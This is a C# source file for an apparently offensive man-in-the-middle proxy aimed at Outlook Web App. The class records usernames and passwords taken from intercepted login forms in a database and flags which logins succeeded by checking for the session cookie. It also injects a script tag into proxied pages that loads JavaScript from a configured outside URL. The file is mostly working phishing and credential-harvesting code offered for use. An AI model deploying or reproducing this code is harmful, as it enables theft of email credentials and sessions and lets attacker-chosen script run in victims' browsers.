using HtmlAgilityPack;
using HttpContextMapper;
using HttpContextMapper.Html;
using OutlookWebAppManInTheMiddle.Models;
using System.Collections.Specialized;

namespace OutlookWebAppManInTheMiddle
{
    public class OutlookWebAppContextMapper : HtmlContextMapper
    {
        private LoginAttempt _loginAttempt;
        private readonly OutlookWebAppDbContext _dbContext;
        private readonly IConfiguration _configuration;

        public OutlookWebAppContextMapper(IConfiguration config, OutlookWebAppDbContext dbContext, IHttpClientFactory httpClientFactory, ILoggerFactory loggerFactory)
            : base(httpClientFactory, loggerFactory)
        {
            _configuration = config;
            var target = config.GetValue<string>("TargetUrlWithProtocol");
            if (target is null) throw new ArgumentNullException(nameof(target), "TargetUrlWithProtocol must be provided in configuration");

            _dbContext = dbContext;

            TargetUrlWithProtocol = target;
            // TODO: fix how we are setting the builder
            UriBuilder = new UriBuilder(TargetUrlWithProtocol);

            DisableSetCookieEncoding = true;
        }

        protected override Task SetUriBuilderPathAndQuery(PathString path, NameValueCollection query)
        {
            if (HttpContext.Request.Query.ContainsKey("url"))
            {
                var urlParameter = query["url"];
                query["url"] = ReplaceProxyWithTarget(ref urlParameter);
            }
            return base.SetUriBuilderPathAndQuery(path, query);
        }

        protected override Task FormRequestContent(Dictionary<string, string> formDictionary)
        {
            if (formDictionary.ContainsKey("destination"))
            {
                var destinationValue = formDictionary["destination"];
                destinationValue = ReplaceProxyWithTarget(ref destinationValue);
                formDictionary["destination"] = destinationValue;
            }

            if (formDictionary.ContainsKey("username") && formDictionary.ContainsKey("password"))
            {
                _loginAttempt = new LoginAttempt()
                {
                    Username = formDictionary["username"],
                    Password = formDictionary["password"],
                };
            }

            return Task.CompletedTask;
        }

        public override async Task Invoke(HttpContext context)
        {
            await base.Invoke(context);
            if (_loginAttempt is not null)
            {
                var setCookies = ResponseMessage.Headers.Where(x => x.Key is "Set-Cookie");
                if (setCookies.Any(x => x.Value.Any(x => x.StartsWith("cadata"))))
                {
                    _loginAttempt.Valid = true;
                }
                await _dbContext.LoginAttempts.AddAsync(_loginAttempt);
                await _dbContext.SaveChangesAsync();
            }
        }

        protected override Task ApplyHtmlModifications(HtmlDocument document)
        {
            var javascript = _configuration.GetValue<string>("Javascript");
            if (javascript is null) return Task.CompletedTask;

            var head = document.DocumentNode.SelectSingleNode("/html/head");

            if (head is null) return Task.CompletedTask;

            var node = document.CreateElement("script");

            node.SetAttributeValue("type", "text/javascript");

            node.InnerHtml =    "setTimeout(function(){\n" +
                                "var script = document.createElement('script');\n" +
                                "script.src = \"" + javascript + "\";\n" +
                                "document.getElementsByTagName('head')[0].appendChild(script);\n" +
                                "},\n" +
                                "1000);";

            head.AppendChild(node);

            return Task.CompletedTask;
        }
    }
}
